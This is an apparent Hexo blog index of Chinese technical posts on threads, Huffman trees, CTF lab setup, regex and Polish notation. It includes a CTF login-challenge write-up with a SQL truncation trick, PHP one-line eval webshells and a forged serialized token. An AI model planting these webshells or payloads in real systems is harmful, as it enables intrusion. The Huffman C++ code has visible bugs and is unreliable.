一个车间里，可以有很多工人。他们协同完成一个任务。 线程就好比车间里的工人。一个进程可以包括多个线程。 车间的空间是工人们共享的，比如许多房间是每个工人都可以进出的。这象征一个进程的内存空间是共享的，每个线程都可以使用这些共享内存。 可是，每间房间的大小不同，有些房间最多只能容纳一个人，比如厕所。里面有人的时候其他人就不能进去了。这代表一个线程使用某些共享内存时，其他线程必须等它结束，才能使用这一块内存 一个防止他人进入的简单方法，就是门口加一把锁。先到的人锁上门，后到的人看到上锁，就在门口排队等锁打开再进去。这就叫”互斥锁”（Mutual exclusion，缩写 Mutex），防止多个线程同时读写某一块内存区域。 还有些房间，可以同时容纳n个人，比如厨房。也就是说，如果人数大于n，多出来的人只能在外面等着。这好比某些内存区域，只能供给固定数目的线程使用。 这时的解决方法，就是在门口挂n把钥匙。进去的人就取一把钥匙，出来时再把钥匙挂回原处。后到的人发现钥匙架空了，就知道必须在门口排队等着了。这种做法叫做”信号量”（Semaphore）用来保证多个线程不会互相冲突。不难看出，mutex是semaphore的一种特殊情况（n=1时）。也就是说，完全可以用后者替代前者。但是，因为mutex较为简单，且效率高，所以在必须保证资源独占的情况下，还是采用这种设计。","link":"2018/12/03/%E5%A4%9A%E7%BA%BF%E7%A8%8B%E5%92%8C%E5%A4%9A%E8%BF%9B%E7%A8%8B%E7%9A%84%E6%9A%A7%E6%98%A7%E7%BC%A0%E7%BB%B5/"},{"title":"如何建立huffmanTree","text":"1、一些基本概念1.1、定义哈夫曼树，又称最优树，是一类带权路径长度最短的树(为了防止前缀重复，所有数据一定为树叶)。 1.2、路径和路径长度从树中一个结点到另一个结点之间的分支构成两个结点的路径，路径上的分支数目叫做路径长度。树的路径长度是从树根到每一个结点的路径长度之和。 1.3、带权路径长度结点的带权路径长度为从该结点到树根之间的路径长度与结点上权的乘积。树的带权路径长度为树中所有叶子结点的带权路径长度之和，通常记作WPL。 若有n个权值为w1,w2,…,wn的结点构成一棵有n个叶子结点的二叉树，则树的带权路径最小的二叉树叫做哈夫曼树或最优二叉树。在上图中，3棵二叉树都有4个叶子结点a、b、c、d，分别带权7、5、2、4，则它们的带权路径长度为 （a）WPL = 7 × 2 + 5 × 2 + 2 × 2 + 4 × 2 = 36 （b）WPL = 4 × 2 + 7 × 3 + 5 × 3 + 2 × 1 = 46 （c）WPL = 7 × 1 + 5 × 2 + 2 × 3 + 4 × 3 = 35 其中（c）的WPL最小，可以验证，（c）恰为哈夫曼树。 2、数据结构表示2.1、结点表示typedef struct{ int weight; int parent; int lchild,rchild;}HuffmanTreeNode; 2.2、一些数据关系1、哈夫曼树除了根结点，其他结点度数都为22、m=2n-1(m代表总结点个数，n代表树叶结点个数)证明:因为 结点总数=度数为0 1 2之和=度数为1+ 2度数为2 +1（根节点）所以 叶子结点数=度数为2的结点数+1所以total=叶子+度数为2=2*n-1 得证 2.3、初始状态 2.4、最终状态 3、创建哈夫曼树步骤假设有n个结点，n个结点的权值分别为w1,w2,…,wn，构成的二叉树的集合为F={T1,T2,…,Tn}，则可构造一棵含有n个叶子结点的哈夫曼树。步骤如下：（1）从F中选取两棵根结点权值最小的树作为左右子树构造一棵新的二叉树，其新的二叉树的权值为其左右子树根结点权值之和； （2）从F中删除上一步选取的两棵二叉树，将新构造的树放到F中； （3）重复（1）（2），直到F只含一棵树为止。 4、哈夫曼编码我们约定左分支表示字符’0’，右分支表示字符’1’，在哈夫曼树中从根结点开始，到叶子结点的路径上分支字符组成的字符串为该叶子结点的哈夫曼编码。上面代码所创建的哈夫曼树如下所示：可以看出3被编码为00，1为010，2为011,4为10,5为11。在这些编码中，任何一个字符的编码均不是另一个字符编码的前缀。 5、C++建立haffmanTree#include&lt;iostream&gt;#include&lt;stack&gt;#include&lt;cstdlib&gt;#include&lt;vector&gt;using namespace std;typedef struct{ int weight; int parent; int lchild,rchild;}HuffmanTreeNode;int min(HuffmanTreeNode* &amp;tree,int k){ int minnum,min_weight; int i=0; while(tree[i].parent!=-1) i++;//先将第一个parent为-1的元素的weight值赋给min_weight,留作以后比较用。 min_weight=tree[i].weight; minnum=i; for(;i&lt;k;i++) { if(tree[i].weight&lt;min_weight&amp;&amp;tree[i].parent==-1) { min_weight=tree[i].weight; minnum=i; } } tree[minnum].parent=1; return minnum;}void Select(HuffmanTreeNode * &amp;tree,int k ,int &amp; i1,int &amp; i2){ i1=min(tree,k); i2=min(tree,k);}void HaffmanTree(HuffmanTreeNode * &amp; tree,int w[],int n){ for(int i=0;i&lt;2*n-1;i++) { tree[i].parent=-1; tree[i].lchild=-1; tree[i].rchild=-1; } for(int i=0;i&lt;n;i++) tree[i].weight=w[i]; int i1,i2; for(int k=n;k&lt;2*n-1;k++) { Select(tree,k,i1,i2);//前K个找最小和第二小 tree[k].weight=tree[i1].weight+tree[i2].weight; tree[i1].parent=k; tree[i2].parent=k; tree[k].lchild=i1; tree[k].rchild=i2; } cout&lt;&lt;&quot;建哈夫曼树成功:\\n&quot;; for (int i=0; i&lt;2*n-1; i++) { cout&lt;&lt;tree[i].weight&lt;&lt;&quot; &quot;&lt;&lt;tree[i].parent&lt;&lt;&quot; &quot;&lt;&lt;tree[i].lchild&lt;&lt;&quot; &quot;&lt;&lt;tree[i].rchild&lt;&lt;endl; }}void ShowHaffmanCoding(HuffmanTreeNode* tree,int n){ int w=2*n-1; vector&lt;stack &lt;char&gt; &gt;HuffmanCode; stack&lt;char&gt;temp; cout&lt;&lt;&quot;debug1&quot;&lt;&lt;endl; //从结点开始找双亲 for(int i=0;i&lt;n;i++){ cout&lt;&lt;&quot;debug2&quot;&lt;&lt;endl; int j=i; int parent= tree[i].parent;//找到双亲 while(parent!=-1) { if(tree[parent].lchild==j) temp.push(&apos;0&apos;);//如果是左孩子 else temp.push(&apos;1&apos;);//右孩子 int j=parent; parent=tree[j].parent;//直到根结点结束 } HuffmanCode.push_back(temp); while(!temp.empty()) temp.pop(); } for(int i=0;i&lt;n;i++) { cout&lt;&lt;&quot;第&quot;&lt;&lt;i+1&lt;&lt;&quot;个数的权值为 : &quot;&lt;&lt;tree[i].weight&lt;&lt;&quot; 编码为： &quot;; while(!HuffmanCode[i].empty()) { cout&lt;&lt;HuffmanCode[i].top(); HuffmanCode[i].pop(); } cout&lt;&lt;endl; }}int main(){ cout&lt;&lt;&quot;请输入权值个数n\\n&quot;; int n=0; cin&gt;&gt;n; int m=2*n-1; HuffmanTreeNode * tree=(HuffmanTreeNode *)malloc(sizeof(HuffmanTreeNode)*m); for(int i=0;i&lt;m;i++){ tree[i].weight=tree[i].parent=tree[i].lchild=tree[i].rchild=0; } cout&lt;&lt;&quot;请输入权值: \\n&quot;; int w[n]; for(int i=0;i&lt;n;i++) cin&gt;&gt;w[i]; HaffmanTree(tree,w,n); ShowHaffmanCoding(tree,n);}","link":"2018/12/27/%E5%A6%82%E4%BD%95%E5%BB%BA%E7%AB%8BhuffmanTree/"},{"title":"废物利用之利用一台废弃笔记本快速搭建CTF实验室基础建设","text":"国庆返校了，感觉这是最后一段时间在学校，发现实验室有一台废弃的笔记本(4G内存，240G固态，废物U),丢了怪可惜的，就用这个笔记本来搭建一套基础设施吧。最后成效是靶场和所有题目穿透出网 内网服务有：共享网盘、共享协作文档、开源渗透靶场、sqlilabs、uploadlabs、xsslabs、w11scan基础指纹识别系统、awvs漏洞扫描系统等，反正白嫖开源项目就完了 一、制作系统 1、下载镜像 2 、制作系统 3、安装系统 4、遇到的一些问题 二、搭建CTF平台 三、配置frp 1、平台映射 2、题目映射，目前好像还没有全端口映射的，我想着把10001-10099的99个ip先映射 3、我错了，真可以多端口range映射 四 、快速建设其他服务 1、内网网盘 2、内网hackmd 3、内网webug安全靶场 4、内网DVWA 5、awvs 6、w11scan 7、sqli-labs 8、upload-labs 9、bwapp 10、webgoat-8.0 11、XSS靶场 12、hexo导航栏 一、制作系统必然是无图形界面的linux,安装也简单 1、下载镜像我在http://mirrors.ustc.edu.cn/ubuntu-releases/16.04/下载，下载ubuntu-16.04.7-server-amd64.is无图形界面就800m-900m 2 、制作系统我直接使用软碟通制作启动盘，简单快捷https://cn.ultraiso.net/xiazai.html，写入硬盘映像即可 3、安装系统毕竟是废弃的笔记本，那就直接使用全磁盘安装 4、遇到的一些问题首先是网络问题，刚安装完的系统，为了在内网稳定还是需要配置稳定的ip首先查看自己的网卡名字ifconfig -a,发现2个，一个是eno1 一个是lo,我们是要选择eno1来配置网络，修改/etc/network/interfaces，添加网络,这里路由器分配192.168.199.1段，我们给他192.168.199.136的ip # This file describes the network interfaces available on your system# and how to activate them. For more information, see interfaces(5).source /etc/network/interfaces.d/*# The loopback network interfaceauto eno1iface eno1 inet staticaddress 192.168.199.136netmask 255.255.255.0gateway 192.168.199.1dns-nameservers 192.168.199.1 还需要修改dns,/etc/resolv.conf ,指定网关就行 # Dynamic resolv.conf(5) file for glibc resolver(3) generated by resolvconf(8)nameserver 192.168.199.1# DO NOT EDIT THIS FILE BY HAND -- YOUR CHANGES WILL BE OVERWRITTEN 然后更新网络配置 sudo ifup eth0sudo ifdown eth0或者/etc/init.d/networking restart 修改语言 root@root:~#cat /etc/default/locale# File generated by update-localeLANG=&quot;en_US.UTF-8&quot;LANGUAGE=&quot;en_US:en&quot; 然后就可以安装ssh，git apt-get install openssh-serverapt-get install sshsudo apt install git 然后就可以使用xshell自己的笔记本连操作 linux还需要设置一下关盖等不休眠不操作,总不可能让笔记本一直打开vim /etc/systemd/logind.conf核心配置为ignore 24 HandleLidSwitch=ignore25 HandleLidSwitchDocked=ignore 二、搭建CTF平台我们选择的是H1ve在内网搭建，然后使用frp穿透服务 安装最新的dockerwget -qO- https://get.docker.com/ | sh安装完会有一个提示，按照提示去执行sudo usermod -aG docker ubuntu 命令执行完成之后，执行 docker verison 来查看是否安装完成。 sudo curl -L https://github.com/docker/compose/releases/download/1.25.1/docker-compose-`uname -s`-`uname -m` -o /usr/local/bin/docker-composesudo chmod +x /usr/local/bin/docker-compose 同样的，命令执行完成之后，执行 docker-compose verison 来查看是否安装完成。换源 sudo vim /etc/docker/daemon.json 将daemon.json的值改为： { &quot;registry-mirrors&quot;: [&quot;https://docker.mirrors.ustc.edu.cn&quot;,&quot;https://mirror.ccs.tencentyun.com&quot;]} （这里还是用一下阿里云申请的镜像快很多）安装H1ve,这里改了改源码的ui，不重要 git clone https://github.com/D0g3-Lab/H1ve.gitcd H1vedocker-compose -f single.yml up#常用docker命令启动服务：docker-compose -f single.yml up -d停止服务：docker-compose -f single.yml stop 三、配置frp1、平台映射我们内网是8000，也就找了一台学生机来穿透出去，选择穿透好处是迁移方便以及废弃笔记本虽然废弃，也比服务器性能好多了（学生机就是穷）。我们也直接在内网服务器上配置frp客户端,这里平台和ssh都映射一下，方便配置frpc.ini [common]server_addr = {{公网ip}}server_port = 7000[tcp]type = tcplocal_ip = 127.0.0.1local_port = 8000remote_port = 8000[real_ssh]type = tcplocal_ip = 127.0.0.1local_port = 22remote_port = 2222 公网只需要配置frps.ini [common]bind_port = 7000 先运行公网的，然后运行内网的frpc，公网就可以访问到 2、题目映射，目前好像还没有全端口映射的，我想着把10001-10099的99个ip先映射其实多写一些配置就行，这里用脚本python build_frp.py &gt; frpc.ini print(&quot;[common]\\nserver_addr = XXX.XX.XXX.XX\\nserver_port = 7002\\n&quot;)#print(&quot;[real_ssh]\\ntype = tcp\\nlocal_ip = 127.0.0.1\\nlocal_port = 22\\nremote_port = 2222\\n&quot;)for i in range(1,10): print(&quot;[ssh2&quot;+str(i)+&quot;]\\ntype = tcp\\nlocal_ip = 127.0.0.1\\nlocal_port = 1000&quot;+str(i)+&quot;\\nremote_port = 1000&quot;+str(i)+&quot;\\n&quot;)for i in range(10,99): print(&quot;[ssh2&quot;+str(i)+&quot;]\\ntype = tcp\\nlocal_ip = 127.0.0.1\\nlocal_port = 100&quot;+str(i)+&quot;\\nremote_port = 100&quot;+str(i)+&quot;\\n&quot;) 3、我错了，真可以多端口range映射参阅https://github.com/fatedier/frp#range-ports-mappingProxy with names that start with range: will support mapping range ports. # frpc.ini[range:test_tcp]type = tcplocal_ip = 127.0.0.1local_port = 6000-6006,6007remote_port = 6000-6006,6007 frpc will generate 8 proxies like test_tcp_0, test_tcp_1, …, test_tcp_7.顺便把22也映射一下备用 四 、快速建设其他服务网盘这样的丢内网就行、就配置穿透了 1、内网网盘共享一下文件资源等docker run -d -p 1880:80 owncloud:10.0 2、内网hackmd协作文档，下次在实验室打比赛啥的，或者记录一下内网文档啥的 git clone https://github.com/hackmdio/docker-hackmd.gitcd docker-hackmd/docker-compose up 然后3000端口访问 3、内网webug安全靶场webug是一个简单靶场，开源免费用起来方便 docker pull area39/webugdocker run -d -p 1882:80 area39/webug 默认密码adminadmin 4、内网DVWADVWA靶场 docker pull vulnerables/web-dvwadocker run -d -p 1884:3443 vulnerables/web-dvwa 默认密码adminpassword 5、awvsawvs简单漏扫用起来方便 docker pull secfa/docker-awvsdocker run -d -p 1881:3443 secfa/docker-awvs 默认用户密码username: admin@admin.compassword: Admin123 6、w11scanw11scan是一个开源指纹识别系统，用起来也挺舒服 docker pull boyhack/w11scandocker run -d -p 1883:8000 boyhack/w11scan:latest 默认密码adminw11scan 7、sqli-labs docker pull acgpiano/sqli-labsdocker run -d -p 1885:80 acgpiano/sqli-labs:latest 8、upload-labs docker pull c0ny1/upload-labs docker run -d -p 1886:80 c0ny1/upload-labs 9、bwapp docker pull raesene/bwappdocker run -d -p 1887:80 raesene/bwapp 默认账号密码bee bug 10、webgoat-8.0docker pull webgoat/webgoat-8.0docker run -d -p 1888:80 webgoat/webgoat-8.0 11、XSS靶场先去这里拉下来https://github.com/c0ny1/vulstudy里面有几个目录，这里xss用这2个，都有dockerfile自己进去build然后run就行xssedXSS-challenge-tour 12、hexo导航栏随着靶场多了，还是整一个内网门户的样子 docker run -d --name hexo -p 4000:4000 -v hexo:/usr/hexo wangcaitao/hexo:1.0.0-alpine docker inspect 10b6cac876a8查看挂载盘,大概就是为了不需要每次拷贝文件，让服务器和docker的默认文件夹同步一下 &quot;Mounts&quot;: [ { &quot;Type&quot;: &quot;volume&quot;, &quot;Name&quot;: &quot;hexo&quot;, &quot;Source&quot;: &quot;/var/lib/docker/volumes/hexo/_data&quot;, &quot;Destination&quot;: &quot;/usr/hexo&quot;, &quot;Driver&quot;: &quot;local&quot;, &quot;Mode&quot;: &quot;z&quot;, &quot;RW&quot;: true, &quot;Propagation&quot;: &quot;&quot; }], 找到那个/var/lib/docker/volumes/hexo/_data文件夹然后，每次修改里面的文件然后命令执行就行 root@asuri:# docker exec -it 10b6cac876a8 hexo cleanroot@asuri:# docker exec -it 10b6cac876a8 hexo g","link":"2020/10/04/%E5%BA%9F%E7%89%A9%E5%88%A9%E7%94%A8%E4%B9%8B%E5%88%A9%E7%94%A8%E4%B8%80%E5%8F%B0%E5%BA%9F%E5%BC%83%E7%AC%94%E8%AE%B0%E6%9C%AC%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BACTF%E5%AE%9E%E9%AA%8C%E5%AE%A4%E5%9F%BA%E7%A1%80%E5%BB%BA%E8%AE%BE/"},{"title":"令人窒息的登录题","text":"一、约束攻击，啥玩意？假如有这么一个登录注册业务注册 &lt;?php// Checking whether a user with the same username exists$username = mysql_real_escape_string($_GET[&apos;username&apos;]);$password = mysql_real_escape_string($_GET[&apos;password&apos;]);$query = &quot;SELECT * FROM users WHERE username=&apos;$username&apos;&quot;;$res = mysql_query($query, $database);if($res) { if(mysql_num_rows($res) &gt; 0) { // User exists, exit gracefully } else { // If not, only then insert a new entry $query = &quot;INSERT INTO users(username, password) VALUES (&apos;$username&apos;,&apos;$password&apos;)&quot;; }} 登录 &lt;?php$username = mysql_real_escape_string($_GET[&apos;username&apos;]);$password = mysql_real_escape_string($_GET[&apos;password&apos;]);$query = &quot;SELECT username FROM users WHERE username=&apos;$username&apos; AND password=&apos;$password&apos; &quot;;$res = mysql_query($query, $database);if($res) { if(mysql_num_rows($res) &gt; 0){ $row = mysql_fetch_assoc($res); return $row[&apos;username&apos;]; }}return Null; 发生原因1.mysql处于ANSI模式。如果是TRADITIONAL模式或者STRICT_TRANS_TABLES模式会报错data too long for column。2.服务端没有对用户名长度进行限制。如果服务端限制了用户名长度就自然就不客能导致数据库截断，也就没有利用条件。3.登陆验证的SQL语句必须是用户名和密码一起验证。如果是验证流程是先根据用户名查找出对应的密码然后再比对密码，当使用vampire为用户名来查询密码的话，数据库此时就会返回两条记录，而一般取第一条即目标用户的记录，那么传输的密码肯定和目标用户密码匹配不上的。4.验证成功后返回的必须是用户传递进来的用户名，而不是从数据库取出的用户名。因为当我们以用户vampire和密码random_pass登陆时，其实数据库返回的是我们自己的用户信息，而我们的用户名其实是vampire+若干个空格，如果此后的业务逻辑以该用户名为准，那么就不能达到越权的目的了。payload 注册一个账号为admin 1 密码随意即可登录获取flag 写入一句话木马 fputs(fopen(&apos;index1.php&apos;,&apos;w&apos;),&apos;&lt;?php @eval($_POST[c]); ?&gt;&apos;);file_put_contents(&quot;aka.php&quot;,&quot;&lt;?php eval(\\$_POST[aka]);?&gt;&quot;); 百度杯”CTF比赛 十月场 —–Login先test1,test1登录，请求头中有个show:0改成1，看到代码，就是代码审计咯 &lt;?php include &apos;common.php&apos;; $requset = array_merge($_GET, $_POST, $_SESSION, $_COOKIE); class db { public $where; function __wakeup() { if(!empty($this-&gt;where)) { $this-&gt;select($this-&gt;where); } } function select($where) { $sql = mysql_query(&apos;select * from user where &apos;.$where); return @mysql_fetch_array($sql); } } if(isset($requset[&apos;token&apos;])) { $login = unserialize(gzuncompress(base64_decode($requset[&apos;token&apos;]))); $db = new db(); $row = $db-&gt;select(&apos;user=\\&apos;&apos;.mysql_real_escape_string($login[&apos;user&apos;]).&apos;\\&apos;&apos;); if($login[&apos;user&apos;] === &apos;ichunqiu&apos;) { echo $flag; }else if($row[&apos;pass&apos;] !== $login[&apos;pass&apos;]){ echo &apos;unserialize injection!!&apos;; }else{ echo &quot;(â¯âµâ¡â²)â¯ï¸µâ´ââ´ &quot;; } }else{ header(&apos;Location: index.php?error=1&apos;); }? 得知要得到flag需要满足 $login[‘user’] === ‘ichunqiu’ 而user被$login = unserialize(gzuncompress(base64_decode($requset[‘token’])));处理过 &lt;?php$a=array(&apos;user&apos;=&gt;&apos;ichunqiu&apos;);var_dump($a);echo base64_encode(gzcompress(serialize($a)));?&gt; 得到eJxLtDK0qi62MrFSKi1OLVKyLraysFLKTM4ozSvMLFWyrgUAo4oKXA==抓包将cookie中加一个token=eJxLtDK0qi62MrFSKi1OLVKyLraysFLKTM4ozSvMLFWyrgUAo4oKXA==有一点很头疼，为啥直接在get请求中加不行么,一定要token中","link":"2019/08/10/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E7%99%BB%E5%BD%95%E9%A2%98/"},{"title":"正则表达式必知必会&&python-re模块简单使用","text":"正则表达式还是要会的，不然你连受处分得资格都没有（无意调侃，莫怪罪。虽然说这样的工具类的东西，知道1，其他的要什么再去查博客啦，文档啦什么的就行，但是如果你觉得有必要，系统性的过一遍，收获还是蛮大的，突然又回想起暑假PM工作那问会不会Linux shell编程，其实之前是看过的，但是没有系统的去学，突然要你写起来就非常僵硬，还是咕咕咕了本书主要内容 前人栽树后人乘凉，前人画图后人观赏（意思就是图是盗来的（读书人怎么能叫盗呢，ε=ε=ε=┏(゜ロ゜;)┛逃。 第一章、入门正则表达式（regular expression，简称 regex）是文本处理方面最强大的工具之一。正则表达式语言用来构造正则表达式（最终构造出来的字符串就称为正则表达式），正则表达式用来完成搜索或替换操作。实际的正则表达式经常被简称为模式，它们其实是一些由字符构成的字符串。这些字符可以是普通字符（纯文本）或元字符（有特殊含义的特殊字符）。推荐一个工具Regester，本地测试的小工具Regester传送门 第二章、匹配单个字符1.匹配纯文本： 文本：Hello , my name is Ben. Please visit my website at http://www.forta.com/ . 正则表达式：Ben 结果：Hello , my name is Ben. Please visit my website at http://www.forta.com/ . 2.匹配任意字符： “.”元字符可以匹配任何一个单个的字符。 3.匹配特殊字符： “\\”元字符可以对有含义的字符进行转义。 小结：正则表达式经常被简称为模式，它们其实是一些由字符构成的字符串。这些字符可以是普通字符（纯文本）或元字符（特殊含义的字符）。“.”可以匹配任何字符。“\\”用来对字符进行转义。 第三章、匹配一组字符1.匹配多个字符中的某一个： “[”和“]”元字符定义一个字符集合。 在使用“[”和“]”定义的字符集合里，这两个字符之间的所有字符都是该集合的组成部分，字符集合的匹配结果是能够与该集合里的任意一个成员相匹配的文本。 2.利用字符集合区间： 正则表达式提供了一个特殊的元字符，字符区间可以用“-”（连字符）来定义。 字符区间：[A-Z]、[a-z]、[A-z]、[A-Za-z0-9] Ps：区间外为“-”本身，无需转义 3.取非匹配： “^”元字符表明对一个字符集合进行取非匹配。 取非：[^0-9]：匹配任何不是数字的字符 小结：元字符“[”和“]”用来定义一个字符集合，其含义是必须匹配该集合里的字符之一。定义一个字符集合的具体做法有两种：一是把所有的字符都列举出来；二是利用元字符“-”以字符区间的方式给出。字符集合可以以元字符“^”来求非，这将把给定的字符集强行排除在匹配操作以外，除了该字符集合里的字符，其他字符都可匹配。 第四章、使用元字符1.元字符：是在正则表达式里有特殊含义的字符。 元字符分类： ①匹配文字（例如“.”） ②正则表达式语法要求（例如“[”“]”） 第五章、重复匹配 1.匹配一个或多个字符： “+”：匹配一个或多个字符或字符集合，不可匹配0个字符。 Ps：一般来说，当在字符集合里使用“.”“+”这样的元字符时，被看做普通字符，无需转义。 2.匹配零个或多个字符： “*”：匹配字符连续出现零次或多次的情况。 3.匹配零个或一个字符： “？”：只能匹配一个字符或字符集合的零次或一次重复。 4.匹配的重复次数： “{”“}”：在其中给出重复次数。 {数字}：确切的数 {小值，大值}：区间 {小值， }：至少重复“小值”次。 第六章、位置匹配 1.边界限定符： ③分行匹配模式：“（?m）”为分行匹配模式，把行分隔符当一个字符串分隔符。 第七章、使用子表达式1.子表达式必须用“（”和“）”括起来。 2.子表达式的嵌套： 文本：Pinging hog.forta.com [12.159.46.200] with 32 bytes of data: 正则表达式：(((\\d{1,2})|(1\\d{2})|(2[0-4]\\d)|(25[0-5])).){3}((\\d{1,2})|(1\\d{2})|(2[0-4]\\d)|(25[0-5])) 结果：Pinging hog.forta.com [12.159.46.200] with 32 bytes of data: 小结：子表达式的作用是把同一个表达式的各个相关部分组合在一起。用“(”“)”来定义。子表达式的常见用途包括：对重复次数元字符的作用对象作出精确的设定和控制、对“|”操作符的OR条件作出准确的定义。 第八章、回溯引用，前后一致匹配1.子表达式的另一用途：定义回溯引用。 2.“\\1”是一个回溯引用，回溯引用指的是模式的后半部分引用在前半部分中定义的子表达式。 Ps：“\\0”用来表示整个正则表达式。 文本：This is a block of of text,several words here are are repeated ,and and they should not be. 正则表达式：[ ]+(\\w+)[ ]+\\1 结果：This is a block of of text,several words here are are repeated ,and and they should not be. 3.回溯引用在替换操作中的应用： 替换操作需要用到两个正则表达式：搜索模式和替换模式。 文本：Hello , ben@forta.com is my email address. 正则表达式： (\\w+[\\w.]*@[\\w.]+.\\w+) 替换：$1 结果：Hello , ben@forta.com is my email address. 第九章、前后查找1.向前查找：指定了一个必须匹配但不在结果中返回的模式。 从语法上来看，一个向前查找模式其实就是一个以“?=”开头的子表达式，需要匹配的文本跟在“=”的后面。 “匹配和返回文本”：消费 “只匹配不返回”：不消费 向前查找（向后查找）匹配本身其实是有返回结果的，只是这个结果的字节长度永远为0而已。因此，前后查找操作有时也称为零宽度匹配操作。 文本： http://www.forta.com/ https://mail.forta.com/ ftp://ftp.forta.com/ 正则表达式： .+(?=:) 结果：http https 2.向后查找：“?&lt;=”元字符。 文本： ABC01：$23.45 HGG42：$5.31 CFMX1：$899.00 XTC99：$69.96 Total items found: 4 正则表达式：(?&lt;=$)[0-9.]+ 结果：ABC01：$23.45 HGG42：$5.31 CFMX1：$899.00 XTC99：$69.96 Total items found: 4 $30 for 100 apples, 50 oranges, and 60 pears. I saved $5 on this order . 正则表达式：\\b(?&lt;!$)\\d+\\b 结果：I paid $30 for 100 apples, 50 oranges, and 60 pears. I saved $5 on this order . （匹配数量） 小结：有了向后查找，可以对最终的匹配结果包含且只包含哪些内容作出更精确的控制。前后查找操作可以利用子表达式来指定文本匹配操作的发生位置，并收到只匹配不消费的效果。 第十章、 嵌入条件1.正则表达式里的条件用“?”来定义。 2.嵌入条件：①根据一个回溯引用来进行条件处理。 ②根据一个前后查找来进行条件处理。 3.回溯引用条件： ?(1)：检查第一个回溯引用是否存在。 文本： 123-456-7890 (123)456-7890 (123)-456-7890 (123-456-7890 1234567890 123 456 7890 正则表达式：(\\()?\\d{3}(?(1))|-)\\d{3}-\\d{4} 结果：123-456-7890 (123)456-7890 (123)-456-7890 (123-456-7890 1234567890 123 456 7890 4.前后查找条件: (?(前后查找表达式)) 文本： 11111 22222 33333- 44444-4444 正则表达式：\\d{5}(?(?=-)-\\d{4}) 结果：11111 22222 33333- 44444-4444 简单的python正则表达式(re模块)1、一个网页的HTML源码。其中有一段 &lt;html&gt;&lt;body&gt;&lt;h1&gt;hello world&lt;h1&gt;&lt;/body&gt;&lt;/html&gt; 你想要把这个hello world提取出来 import rekey = r&quot;&lt;html&gt;&lt;body&gt;&lt;h1&gt;hello world&lt;h1&gt;&lt;/body&gt;&lt;/html&gt;&quot;#这段是你要匹配的文本p1 = r&quot;(?&lt;=&lt;h1&gt;).+?(?=&lt;h1&gt;)&quot;#这是我们写的正则表达式规则，你现在可以不理解啥意思pattern1 = re.compile(p1)#我们在编译这段正则表达式matcher1 = re.search(pattern1,key)#在源文本中搜索符合正则表达式的部分print matcher1.group(0)#打印出来 2、既有http://开头的，又有https://开头的，我们怎么处理？ import rekey = r&quot;http://www.nsfbuhwe.com and https://www.auhfisna.com&quot;#胡编乱造的网址，别在意p1 = r&quot;https*://&quot;#看那个星号！1pattern1 = re.compile(p1)print pattern1.findall(key) 输出 [&apos;http://&apos;, &apos;https://&apos;] findall函数返回的总是正则表达式在字符串中所有匹配结果的列表","link":"2019/01/15/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%BF%85%E7%9F%A5%E5%BF%85%E4%BC%9A/"},{"title":"波兰式与逆波兰表达式","text":"前缀、中缀、后缀表达式(逆波兰表达式)整体介绍 前缀表达式、中缀表达式、后缀表达式都是四则运算的表达方式,用以四则运算表达式求值 ,即数学表达式的求值 一、中缀表达式1.1、简介 中缀表达式就是常见的运算表达式，如(3+4)×5-6 二、前缀表达式2.1、简介 前缀表达式又称波兰式，前缀表达式的运算符位于操作数之前 比如:- × + 3 4 5 6 2.2、如何通过前缀表达式来求值 从右至左扫描表达式，遇到数字时，将数字压入堆栈，遇到运算符时，弹出栈顶的两个数，用运算符对它们做相应的计算（栈顶元素 op 次顶元素），并将结果入栈；重复上述过程直到表达式最左端，最后运算得出的值即为表达式的结果 例如:- × + 3 4 5 6 从右至左扫描，将6、5、4、3压入堆栈 遇到+运算符，因此弹出3和4（3为栈顶元素，4为次顶元素，注意与后缀表达式做比较），计算出3+4的值，得7，再将7入栈 接下来是×运算符，因此弹出7和5，计算出7×5=35，将35入栈 最后是-运算符，计算出35-6的值，即29，由此得出最终结果 2.3、将中缀表达式转换为前缀表达式 转换步骤如下: 初始化两个栈:运算符栈s1，储存中间结果的栈s2 从右至左扫描中缀表达式 遇到操作数时，将其压入s2 遇到运算符时，比较其与s1栈顶运算符的优先级 如果s1为空，或栈顶运算符为右括号“)”，则直接将此运算符入栈 否则，若优先级比栈顶运算符的较高或相等，也将运算符压入s1 否则，将s1栈顶的运算符弹出并压入到s2中，再次转到(4-1)与s1中新的栈顶运算符相比较 遇到括号时 如果是右括号“)”，则直接压入s1 如果是左括号“(”，则依次弹出S1栈顶的运算符，并压入S2，直到遇到右括号为止，此时将这一对括号丢弃 重复步骤2至5，直到表达式的最左边 将s1中剩余的运算符依次弹出并压入s2 依次弹出s2中的元素并输出，结果即为中缀表达式对应的前缀表达式 例如:1+((2+3)×4)-5具体过程，如下表 结果是:- + 1 × + 2 3 4 5 三、后缀表达式(逆波兰表达式)3.1、简介 后缀表达式又称逆波兰表达式,与前缀表达式相似，只是运算符位于操作数之后 比如:3 4 + 5 × 6 - 3.2、后缀表达式计算机求值 与前缀表达式类似，只是顺序是从左至右： 从左至右扫描表达式，遇到数字时，将数字压入堆栈，遇到运算符时，弹出栈顶的两个数，用运算符对它们做相应的计算（次顶元素 op 栈顶元素），并将结果入栈；重复上述过程直到表达式最右端，最后运算得出的值即为表达式的结果 例如后缀表达式“3 4 + 5 × 6 -”： 从左至右扫描，将3和4压入堆栈； 遇到+运算符，因此弹出4和3（4为栈顶元素，3为次顶元素，注意与前缀表达式做比较），计算出3+4的值，得7，再将7入栈； 将5入栈； 接下来是×运算符，因此弹出5和7，计算出7×5=35，将35入栈； 将6入栈； 最后是-运算符，计算出35-6的值，即29，由此得出最终结果。 3.3、将中缀表达式转换为后缀表达式步骤 与转换为前缀表达式相似，步骤如下： 初始化两个栈：运算符栈s1和储存中间结果的栈s2； 从左至右扫描中缀表达式； 遇到操作数时，将其压s2； 遇到运算符时，比较其与s1栈顶运算符的优先级： 如果s1为空，或栈顶运算符为左括号“(”，则直接将此运算符入栈； 否则，若优先级比栈顶运算符的高，也将运算符压入s1（注意转换为前缀表达式时是优先级较高或相同，而这里则不包括相同的情况）； 否则，将s1栈顶的运算符弹出并压入到s2中，再次转到(4-1)与s1中新的栈顶运算符相比较； 遇到括号时： 如果是左括号“(”，则直接压入s1； 如果是右括号“)”，则依次弹出s1栈顶的运算符，并压入s2，直到遇到左括号为止，此时将这一对括号丢弃； 重复步骤2至5，直到表达式的最右边； 将s1中剩余的运算符依次弹出并压入s2； 